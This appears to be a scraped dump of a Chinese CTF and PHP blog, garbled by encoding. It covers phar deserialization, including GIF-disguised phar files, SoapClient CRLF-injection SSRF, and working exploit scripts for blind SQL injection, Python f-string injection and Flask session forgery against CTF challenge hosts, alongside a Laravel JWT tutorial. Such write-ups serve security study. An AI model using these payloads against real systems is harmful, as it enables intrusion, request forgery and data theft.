æå–pharæ–‡æ¡£å†…å®¹ demo123456789101112131415161718192021222324252627&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-&gt;stopBuffering();&#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—&#x2F;&#x2F;åˆ›å»ºpharæ–‡ä»¶&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#39;Destruct called&#39;; &#125; &#125; $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;test.txt&#39;; file_get_contents($filename); &#x2F;&#x2F;åˆ©ç”¨é¡µé¢&#x2F;&#x2F;è¾“å‡ºDestruct called&#x2F;&#x2F;æ‰€ä»¥è¾¾åˆ°äº†ååºåˆ—åŒ–TestObjectå¯¹è±¡çš„ç›®çš„ å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶phpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚ 123456789101112131415&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt;&#x2F;&#x2F;ç”Ÿæˆçš„pharæ–‡ä»¶ä¼šè¢«æ–‡ä»¶å¤´æ£€æµ‹ä¸ºGIF ä½¿ç”¨phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»PHPå†…ç½®ç±»12345678910111213141516171819202122$classes &#x3D; get_declared_classes();foreach ($classes as $class) &#123; $methods &#x3D; get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( &#39;__destruct&#39;, &#39;__toString&#39;, &#39;__wakeup&#39;, &#39;__call&#39;, &#39;__callStatic&#39;, &#39;__get&#39;, &#39;__set&#39;, &#39;__isset&#39;, &#39;__unset&#39;, &#39;__invoke&#39;, &#39;__set_state&#39; ))) &#123; print $class . &#39;::&#39; . $method . &quot;\\n&quot;; &#125; &#125;&#125;&#x2F;&#x2F;è¾“å‡ºç»“æœä¸ºphpä¸­å†…ç½®çš„ç±»åŠæ–¹æ³• SoapClient__callæ–¹æ³•æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³• 123456&lt;?php$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;bbb&#39;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));$b &#x3D; serialize($a);echo $b;$c &#x3D; unserialize($b);$c-&gt;not_exists_function(); åœ¨æœåŠ¡å™¨æˆ–è€…è™šæ‹Ÿæœºå¼€å¯ncç›‘å¬ç«¯å£,å°±ä¼šæ”¶åˆ°SoapClientå¯¹è±¡çš„httpè¯·æ±‚,æºå¸¦ç€ä¸€æ®µxmlæ–‡æœ¬ SOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\\x0d\\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ 123456&lt;?php$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&quot;bbb\\r\\n\\r\\nccc\\r\\n&quot;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));$b &#x3D; serialize($a);echo $b;$c &#x3D; unserialize($b);$c-&gt;not_exists_function(); ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typ,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼ 1234567891011121314151617&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5555&#x2F;path&#39;;$post_string &#x3D; &#39;data&#x3D;something&#39;;$headers &#x3D; array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: PHPSESSID&#x3D;my_session&#39; );$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));$aaa &#x3D; serialize($b);$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\\r\\n&quot;,$aaa);$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c &#x3D; unserialize($aaa);$c-&gt;not_exists_function();?&gt; å¦‚ä¸Šï¼Œä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLFå¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚ã€‚ Deserialization + __call + SoapClient + CRLF = SSRF CTFé¢˜ç›®n1ctf2018 easy_harder_php [SUCTF-2019 Upload Labs 2](https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload Labs 2) Referenceå››ä¸ªå®ä¾‹é€’è¿›phpååºåˆ—åŒ–æ¼æ´ç†è§£ åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"[BSidesSF 2020]Cards","date":"2020-04-07T16:00:00.000Z","path":"2020/04/08/CTF_WP/[BSidesSF 2020]Cards/","text":"[BSidesSF 2020]Cardsåˆ†æ21ç‚¹æ¸¸æˆ,æŸ¥çœ‹rules,21ç‚¹3:2,ä¸‹æ³¨æœ€å¤š500,æ‰€ä»¥æ¯æ¬¡æœ€å¤šèµ¢750è¦èµšåˆ°100000 éšä¾¿è¯•ä¸€ä¸‹,æœ‰ä¸€ä¸ªåˆå§‹åŒ–çš„/apiè·å–åˆå§‹é‡‘é’±å’Œsecretstate /api/dealä¸‹æ³¨ è¦è¾¾åˆ°çš„ç›®çš„,åˆ©ç”¨è·å–æ–°çš„secretstate,æ—§çš„æ²¡æœ‰å¤±æ•ˆçš„è¾¾åˆ°ä¸€ç›´èµšé’±çš„æ•ˆæœ exp12345678910111213141516171819202122import requestsimport timestart &#x3D; &quot;http:&#x2F;&#x2F;bd6d39d5-cd91-4bb9-b2ef-e753aa13f02d.node3.buuoj.cn&#x2F;api&quot;deal &#x3D; start + &quot;&#x2F;deal&quot;#å¼€å§‹state &#x3D; requests.post(start).json()[&quot;SecretState&quot;]while True: try: #ä¸‹æ³¨ result &#x3D; requests.post(deal, json&#x3D;&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;).json() except: print(result) continue time.sleep(0.1) if result[&#39;GameState&#39;] &#x3D;&#x3D; &#39;Blackjack&#39;: #èµ¢äº†å°±æ¢SecretState state &#x3D; result[&#39;SecretState&#39;] print(result[&#39;Balance&#39;]) if result[&#39;Balance&#39;] &gt; 100000: print(result) break","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"PyCalX 1å’Œ2","date":"2020-04-07T16:00:00.000Z","path":"2020/04/08/CTF_WP/PyCalX 1å’Œ2/","text":"PyCalX 1å’Œ2åˆ†æé¦–å…ˆæ˜¯1,å®¡è®¡æºç ,souceå¯æ§,æ¨¡æ‹Ÿsqlæ³¨å…¥æ”¹å˜æ“ä½œ exp12345678910111213141516171819202122232425262728293031323334353637383940import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;44f679f2-1772-4584-b810-90c98139efc8.node3.buuoj.cn&#x2F;&#39;flag &#x3D; &#39;flag&#123;&#39;url &#x3D; url + &quot;cgi-bin&#x2F;pycalx.py&quot;while True: high &#x3D; 127 low &#x3D; 1 mid &#x3D; (high + low) &#x2F;&#x2F; 2 while high &gt; low: tmp &#x3D; flag + chr(mid) data &#x3D; &#123; &#39;value1&#39;: &#39;a&#39;, &#39;op&#39;: &#39;+\\&#39;&#39;, &#39;value2&#39;: &#39;and FLAG&gt;source#&#39;, &#39;source&#39;: tmp &#125; data2&#x3D;&#123; &#39;value1&#39;:&#39;Tru&#39;, &#39;op&#39;:&#39;+f&#39;, &#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;, &#39;source&#39;:tmp &#125; r &#x3D; requests.get(url, data) print(chr(mid), end&#x3D;&quot;&quot;) if r.status_code &#x3D;&#x3D; 200: if &#39;True&#39; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (high + low) &#x2F;&#x2F; 2 else: time.sleep(1) flag +&#x3D; chr(mid-1) print(&quot; | flag&#x3D;&quot;+flag) if &quot;&#125;&quot; in flag: breakprint(&quot;flag&#x3D;&quot;+flag) åˆ†æç„¶åæ˜¯2,è¿›ä¸€æ­¥è¿‡æ»¤äº†&#39;&#39;æ‰€ä»¥åˆ©ç”¨python3çš„F-strings 1234&#39;value1&#39;:&#39;Tru&#39;,&#39;op&#39;:&#39;+f&#39;,&#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;,&#39;source&#39;:&#39;flag&#123;a&#39; åˆ©ç”¨python3.6ä»¥åçš„ç‰¹æ€§f&#39;&#123;ä¸­é—´å¯ä»¥åŠ è¡¨è¾¾å¼&#125;&#39;,å½“sourceä¸ºFLAGä¸­å­—ç¬¦æ—¶è¾“å‡ºä¸ºTru+101:c(å°±æ˜¯å­—ç¬¦e)ç»„åˆæˆTrue,è¡¨ç¤ºç»“æœä¸ºfalseæ—¶è¾“å‡ºTruf,å†printä¼šè§¦å‘å¼‚å¸¸ç„¶åå°±ä¼šè¾“å‡ºInvalid ç„¶åå°±å¯ä»¥æ”¹å˜è¡¨è¾¾å¼æ¥ç›²æ³¨,ä½†æ˜¯æœ€ç»ˆå¹¶æ²¡æœ‰å¤ç°å‡ºæ¥ çº¿ä¸Šæµ‹è¯•éƒ½ä¸ºInvalid æœ¬åœ°æµ‹è¯• 12345678910111213141516FLAG &#x3D; &quot;flag&#123;test&#125;&quot;source &#x3D; &quot;fla&quot;try: result &#x3D; str(eval(&#39;Tru&#39;+f&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;)) if result.isdigit() or result &#x3D;&#x3D; &#39;True&#39; or result &#x3D;&#x3D; &#39;False&#39;: print(result) else: print(&quot;Invalid&quot;) # Sorry we don&#39;t support output as a string due to security issue. print(1)except: print(&quot;Invalid&quot;) print(2)#è¾“å‡ºç»“æœä¸º&#96;True&#96;#å½“source&#x3D;&quot;flb&quot;æ—¶è¾“å‡ºä¸º#Invalid#2","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"Laravelä½¿ç”¨JWT","date":"2020-04-01T16:00:00.000Z","path":"2020/04/02/Note/laravelä½¿ç”¨jwt/","text":"Laravelä½¿ç”¨JWTå‰è¨€laravelä½¿ç”¨JWTæœ‰ä¸¤ç§æ–¹æ³•,ä¸€ä¸­æ˜¯ä½¿ç”¨å†…ç½®çš„Authç»“åˆJWTå®šä¹‰çš„ä¸­é—´ä»¶è¿›è¡Œè®¤è¯,è¿™ç§æ–¹æ³•laravelç¤¾åŒºæœ‰å¾ˆå¤šæ•™ç¨‹,è¿™é‡Œä¸å†ç»†è¯´ï¼Œè°ˆè°ˆå¦‚ä½•ä½¿ç”¨è‡ªå®šä¹‰JWTæ¥å®Œæˆç”¨æˆ·è®¤è¯ JWT-oathå®‰è£…123#ä½¿ç”¨composerå®‰è£…jwt-oathæ‰©å±•#å½“ç„¶ä¹Ÿå¯ä»¥å†™è¿›composer.jsonæ–‡ä»¶ä¸­composer require tymon&#x2F;jwt-auth ç”ŸæˆåŠ å¯†å¯†åŒ™123# è¿™æ¡å‘½ä»¤ä¼šåœ¨ .env æ–‡ä»¶ä¸‹ç”Ÿæˆä¸€ä¸ªåŠ å¯†å¯†é’¥ï¼Œå¦‚ï¼šJWT_SECRET&#x3D;foobar#æ³¨æ„.envæ–‡ä»¶é»˜è®¤æ˜¯ä¸ä¼šä¸Šä¼ gitçš„,ä¸ºäº†ä½ çš„åŒä¼´ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨è®¤è¯,éœ€è¦åœ¨.env.exampleä¸­æ‰‹åŠ¨æ·»åŠ ç›¸åŒçš„å­—æ®µphp artisan jwt:secret æ³¨å†Œä¸¤ä¸ª Facadeè¿™ä¸¤ä¸ª Facade å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯ä½¿ç”¨å®ƒä»¬ä¼šç»™ä½ çš„ä»£ç ç¼–å†™å¸¦æ¥ä¸€ç‚¹ä¾¿åˆ©ã€‚ config/app.php 123456&#39;aliases&#39; &#x3D;&gt; [ ... &#x2F;&#x2F; æ·»åŠ ä»¥ä¸‹ä¸¤è¡Œ &#39;JWTAuth&#39; &#x3D;&gt; &#39;Tymon\\JWTAuth\\Facades\\JWTAuth&#39;, &#39;JWTFactory&#39; &#x3D;&gt; &#39;Tymon\\JWTAuth\\Facades\\JWTFactory&#39;,], ä¿®æ”¹ auth.phpconfig/auth.php 1234567891011&#39;guards&#39; &#x3D;&gt; [ &#39;web&#39; &#x3D;&gt; [ &#39;driver&#39; &#x3D;&gt; &#39;session&#39;, &#39;provider&#39; &#x3D;&gt; &#39;users&#39;, ], &#39;api&#39; &#x3D;&gt; [ &#39;driver&#39; &#x3D;&gt; &#39;jwt&#39;, &#x2F;&#x2F; åŸæ¥æ˜¯ token æ”¹æˆjwt &#39;provider&#39; &#x3D;&gt; &#39;users&#39;, ],], å¤„ç†æµç¨‹ ä½¿ç”¨æ–¹æ³•ç”Ÿæˆ123456789101112&lt;?php&#x2F;&#x2F;è‡ªå®šä¹‰çš„è½½è·å¡«å……$customClaims &#x3D; [ &#39;iss&#39; &#x3D;&gt; &quot;http:&#x2F;&#x2F;market.sky31.com&quot;, &#39;share&#39; &#x3D;&gt; md5($stu_id), ];&#x2F;&#x2F;åˆ©ç”¨JWTå·¥å‚ç±»ç”Ÿæˆæ ¹æ®è‡ªå®šä¹‰çš„è½½è·ç”Ÿæˆpayload$payload &#x3D; \\JWTFactory::customClaims($customClaims)-&gt;make();&#x2F;&#x2F;è°ƒç”¨Authç±»çš„encodeæ–¹æ³•å°±å¯ä»¥ç”Ÿæˆtoken$token &#x3D; \\JWTAuth::encode($payload);&#x2F;&#x2F;æ³¨æ„,æ­¤å¤„çš„tokenæ˜¯ä¸€ä¸ªç±»,å¦‚ä½•ç›´æ¥æ·»åŠ è¿›response()-&gt;json()ä¸­å°†ä¼šæŠ¥é”™,æ‰€ä»¥å¼ºåˆ¶è½¬æ¢ä¸ºStringä¾¿å¯ä»¥å½“æˆå­—ç¬¦åºŠæ­£å¸¸ä½¿ç”¨äº†return (string)$token; éªŒè¯1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php&#x2F;&#x2F;è®¤è¯å¯ä»¥å†™åœ¨ä¸­é—´ä»¶ä¸­&#x2F;&#x2F;é¦–éƒ¨useæ·»åŠ JWTçš„æ‰€æœ‰å¼‚å¸¸ç±»use Tymon\\JWTAuth\\Exceptions\\JWTException;use Tymon\\JWTAuth\\Exceptions\\TokenExpiredException;use Tymon\\JWTAuth\\Exceptions\\TokenInvalidException;&#x2F;&#x2F;ä¸€å®šè¦ä½¿ç”¨try catchç‰ˆå¿«æ¥éªŒè¯token,tokençš„éªŒè¯å¤±è´¥,è¿‡æœŸç­‰ç­‰å¼‚å¸¸éƒ½æ˜¯throwä¸€ä¸ªå¼‚å¸¸,ä¸æ•è·å¼‚å¸¸ç¨‹åºç›´æ¥æ­»æ‰äº†,ä¸”é”™è¯¯ä¿¡æ¯ä¸å¯ä»¥å®šä¹‰,å°±ä¼šå¯¼è‡´ä»£ç ä¸ä¸¥è°¨try &#123; &#x2F;&#x2F;å®šä¹‰ä¸€ä¸ªAuthç±»æ¥éªŒè¯token,é¦–å…ˆå°†ä¼ è¿‡æ¥çš„tokenç»‘å®šåœ¨ç±»ä¸­ $token &#x3D; \\JWTAuth::setToken($data[&#39;token&#39;]); &#x2F;&#x2F;è°ƒç”¨ä»¥ä¸‹æ–¹æ³•å¯ä»¥è·å–tokenä¸­è½½è·çš„æ•°æ®æ¥ä½¿ç”¨ $user_id&#x3D;$token-&gt;payload()-&gt;get()[&#39;user_id&#39;]; &#x2F;&#x2F;éªŒè¯token,æ­£ç¡®å°±ä¼šå–å‡ºå…¶ä¸­çš„è½½è·è¿”å›ä¸€ä¸ªåªå«æœ‰è½½è·çš„å¯¹è±¡, &#x2F;&#x2F;å¤±è´¥å°±ä¼šæŠ›å‡ºå¼‚å¸¸,å¤±è´¥çš„åŸå› æœ‰è®¸å¤š,è¿‡æœŸ,æ•°æ®æ ¼å¼ä¸å¯¹,æ•´ä¸ªJWTè¿‡æœŸ $token-&gt;checkOrFail(); &#x2F;&#x2F;è¿˜æœ‰ä¸€ä¸ª$token()-&gt;checkæ–¹æ³•å¯ä»¥éªŒè¯token,è¿”å›å€¼ä¸ºbool,éªŒè¯å¤±è´¥ä¸ä¼šæŠ›å‡ºå¼‚å¸¸è€Œæ˜¯è¿”å›false &#x2F;&#x2F;æ•è·è¿‡æœŸå¼‚å¸¸ç„¶åå»åˆ·æ–°è¿‡æœŸæ—¶é—´&#125; catch (TokenExpiredException $e) &#123; try &#123; &#x2F;&#x2F;åˆ·æ–°token,è¿”å›å€¼æ˜¯æ›´æ–°è¿‡æœŸæ—¶é—´çš„æ–°token $new_token&#x3D;$token-&gt;refresh(); &#x2F;&#x2F;æ›´æ–°æ•°æ®åº“ä¸­çš„token $user&#x3D; User::query()-&gt;where(&#39;user_id&#39;,$user_id)-&gt;first(); $user-&gt;token&#x3D;$new_token; $user-&gt;save(); &#x2F;&#x2F;å°†æ–°tokenè®¾ç½®åœ¨requestçš„å‚æ•°ä¸­ä¼ ç»™ä¸‹ä¸€ä¸ªè·¯ç”± $request-&gt;request-&gt;set(&quot;token&quot;,$new_token); &#x2F;&#x2F;å¦‚æœåˆ·æ–°ä¸äº†,ä¹Ÿè¿‡æœŸäº†å°±è¿”å›é”™è¯¯ç è®©ç”¨æˆ·é‡æ–°ç™»å½• &#125;catch (TokenExpiredException $e)&#123; &#x2F;&#x2F;msgæ˜¯æˆ‘è‡ªå®šä¹‰çš„ç”¨æ¥è¿”å›jsonçš„,ä¸ç”¨ç®¡ return msg(3,__LINE__); &#125; &#x2F;&#x2F;tokenæ ¼å¼é”™è¯¯&#125; catch (TokenInvalidException $e) &#123; return msg(403,$e-&gt;getMessage());&#125;catch (JWTException $e) &#123; return msg(403,$e-&gt;getMessage());&#125;&#x2F;&#x2F;å°†requestä¼ ç»™ä¸‹ä¸‹ä¸€ä¸ªè·¯ç”±,åˆ°è¿™é‡Œè®¤è¯ä¾¿æˆåŠŸäº†return $next($request); è¯´æ˜JWT-oathæ‰©å±•ä¼šåœ¨configç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªjwt.php,é‡Œé¢å®šä¹‰äº†JWTçš„ç›¸å…³é…ç½® **æ³¨æ„:**è¿™ä¸ªæ‰©å±•æœ‰ä¸¤ç§è¿‡æœŸæ–¹å¼,ä¸€ç§çš„tokenæœ‰æ•ˆæœŸ,æ—¶é—´çŸ­,è¿‡æœŸäº†éœ€è¦åˆ·æ–°,ä¸€ç§æ˜¯åˆ·æ–°æœ‰æ•ˆæœŸ,æ—¶é—´é•¿,åªè¦åœ¨æœ‰æ•ˆæœŸå†…æ‹¿ä¸åœ¨é»‘åå•çš„æ—§tokenæ¥åˆ·æ–°å°±å¯ä»¥,æ—¶é—´ä¸€é•¿ä¸€çŸ­å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢tokenç›—ç”¨ å¸¸ç”¨é…ç½® 123456789101112131415161718&#x2F;&#x2F;jwtæœ‰æ•ˆæœŸ,é»˜è®¤æ˜¯60åˆ†é’Ÿ,å•ä½æ˜¯åˆ†é’ŸJWT_TTL &#x2F;&#x2F;jwtçš„åˆ·æ–°æœ‰æ•ˆæœŸ,å•ä½æ˜¯åˆ†é’Ÿ,é»˜è®¤æ˜¯20160(14å¤©)JWT_REFRESH_TTL&#x2F;&#x2F;æ³¨æ„ä»¥ä¸Šä¸¤ä¸ªæ—¶é—´ä¸å¯ä»¥ç”¨60*24è¿™ç§æ ¼å¼,éœ€è¦è®¾ç½®ä¸º120è¿™æ ·çš„æ•´æ•°&#x2F;&#x2F;å¿…é¡»å¡«å……çš„è½½è·,åœ¨ä½ è‡ªå·±è®¾å®šè½½è·çš„æ—¶å€™å¿…é¡»å…¨éƒ¨æ‰‹åŠ¨å¡«å……,ä¸ç„¶ä¼šæŠ¥é”™,æ— æ³•ç”Ÿæˆ,ä¸æƒ³è‡ªå®šä¹‰çš„å¯ä»¥æ³¨é‡Šæ‰ &#39;required_claims&#39; &#x3D;&gt; [ &#39;iss&#39;,&#x2F;&#x2F; &#39;iat&#39;,&#x2F;&#x2F; &#39;exp&#39;,&#x2F;&#x2F; &#39;nbf&#39;,&#x2F;&#x2F; &#39;sub&#39;,&#x2F;&#x2F; &#39;jti&#39;, ], &#x2F;&#x2F;issé»˜è®¤æ˜¯ä½¿ç”¨ç”¨äºè¯·æ±‚çš„apiè·¯å¾„&#x2F;&#x2F;è®¾ç½®é»‘åå•,å½“ä¸ºfalseæ—¶,åˆ·æ–°åç”Ÿæˆæ–°token,æ—§tokenä»ç„¶å¯ä»¥ç”¨&#x2F;&#x2F;trueéªŒè¯æ—¶å°±ä¼šæŠ›å‡ºé»‘åå•å¼‚å¸¸ä¿¡æ¯blacklist_enabled å»ºè®®æ˜¯ä¿®æ”¹.envä¸­çš„ç¯å¢ƒå˜é‡,ä¸è¦ä¿®æ”¹jwt.phpæ–‡ä»¶,å› ä¸ºjwt.phpæ–‡ä»¶ä¸­çš„é…ç½®é¡¹å¤§éƒ½æ˜¯ä».envä¸­è·å–çš„,æ²¡æœ‰è·å–åˆ°ä¼šç”¨é»˜è®¤å€¼","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"php","slug":"php","permalink":"https://yanmymickey.github.io/tags/php/"},{"name":"laravel","slug":"laravel","permalink":"https://yanmymickey.github.io/tags/laravel/"},{"name":"jwt","slug":"jwt","permalink":"https://yanmymickey.github.io/tags/jwt/"}]},{"title":"CTFshowå†…éƒ¨èµ›_WP","date":"2020-03-28T16:00:00.000Z","path":"2020/03/29/CTF_WP/ctfshow_å†…éƒ¨èµ›/","text":"CTFshowå†…éƒ¨èµ›_WPWebWeb1åˆ†æ1www.zipæºç æ³„éœ²,ä»£ç å®¡è®¡,register.phpä¸­çš„é»‘åå•é™åˆ¶è¾ƒå°‘,åˆ†æå¯å¾—æ³¨å†Œçš„ç”¨æˆ·åå†™å…¥seesion,ç„¶åç›´æ¥ç”¨sessionä¸­çš„ç”¨æˆ·åå¾…å…¥æŸ¥è¯¢,ä¸2018ç½‘é¼æ¯Unfinishå·®ä¸å¤š,è¯¦æƒ…æœç´¢ exp123456789101112131415161718192021222324252627282930313233343536373839import requestsimport re,binasciilogin_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;login.php&quot;register_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;register.php&quot;s&#x3D;requests.session()users_email &#x3D; [&quot;test&quot; + str(i) + &quot;@qq.com&quot; for i in range(0,17)]def register(user_email,offset,s): reg_datas &#x3D; &#123; &quot;e&quot; : user_email, #&quot;username&quot; : &quot;0&#39;+(select substr(hex(hex((select * from flag))) from &quot; + str(1+offset*10)+ &quot; for 10))+&#39;0&quot;, # &quot;username&quot;:&quot;test&quot;, &quot;u&quot;:&quot;0&#39;+(select&#x2F;**&#x2F;substr(hex(hex((select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)))&#x2F;**&#x2F;from&#x2F;**&#x2F;&quot; + str(1+offset*10)+ &quot;&#x2F;**&#x2F;for&#x2F;**&#x2F;10))+&#39;0&quot;, &quot;p&quot;:&quot;test&quot; &#125; # print(reg_datas[&#39;username&#39;]) r &#x3D; s.post(url &#x3D; register_url,data &#x3D; reg_datas,allow_redirects&#x3D;True) # print(r.request.body) # print(r.status_code) return rdef login(user_email,s): login_data&#x3D;&#123; &quot;e&quot;:user_email, &quot;p&quot;:&quot;test&quot; &#125; r &#x3D; s.post(url&#x3D;login_url, data&#x3D;login_data, allow_redirects&#x3D;True) pattern &#x3D; &#39;Hello\\s*(\\S*),&#39; return re.findall(pattern,r.text)[0]if __name__ &#x3D;&#x3D; &#39;__main__&#39;: flag_double_hex &#x3D; &#39;&#39;# email&#x3D;&quot;test@mail.com&quot;# offset&#x3D;1 for email,offset in zip(users_email,range(0,len(users_email))): print(email,offset) r&#x3D;register(email,offset,s) test &#x3D; login(email,s) print(test) flag_double_hex +&#x3D; test print(&quot;[+] &quot; + flag_double_hex) print(&quot;flag: &quot; + binascii.a2b_hex(binascii.a2b_hex(flag_double_hex)).decode()) Web2åˆ†ææŸ¥çœ‹é¡µé¢æºä»£ç æœ‰æç¤º,param:ctfshow key:ican å›¾ç‰‡æ˜¯csséƒ½åœ¨staticæ–‡ä»¶å¤¹ä¸‹,æ²¡æœ‰index.phpç­‰ç­‰, éšä¾¿ç™»å½•å‘ç°è¦admin,æŸ¥çœ‹cookies,å‘ç°æ˜¯session,æƒ³åˆ°flask å¼€å§‹ä¼ªé€ adminçš„session ä¼ªé€ è„šæœ¬123456789101112131415161718192021222324252627282930313233343536# # coding:utf-8from flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport hashlibclass SimpleSecureCookieSessionInterface(SecureCookieSessionInterface): # Override method # Take secret_key instead of an instance of a Flask app def get_signing_serializer(self, secret_key): if not secret_key: return None signer_kwargs &#x3D; dict( key_derivation&#x3D;&quot;hmac&quot;, digest_method&#x3D;hashlib.sha1 ) return URLSafeTimedSerializer(secret_key, salt&#x3D;&quot;cookie-session&quot;, serializer&#x3D;self.serializer, signer_kwargs&#x3D;signer_kwargs)def decodeFlaskCookie(secret_key, cookieValue): sscsi &#x3D; SimpleSecureCookieSessionInterface() signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key) return signingSerializer.loads(cookieValue)# Keep in mind that flask uses unicode strings for the# dictionary keysdef encodeFlaskCookie(secret_key, cookieDict): sscsi &#x3D; SimpleSecureCookieSessionInterface() signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key) return signingSerializer.dumps(cookieDict)if __name__&#x3D;&#x3D;&#39;__main__&#39;: sk &#x3D; &quot;ican&quot; sessionDict &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;&#125; cookie &#x3D; encodeFlaskCookie(sk, sessionDict) #decodedDict &#x3D; decodeFlaskCookie(sk, session) print(cookie) æ›¿æ¢testçš„sesionåˆ·æ–°é¡µé¢å‘ç°ç¼ºå°‘å‚æ•°,æ·»åŠ ctfshow 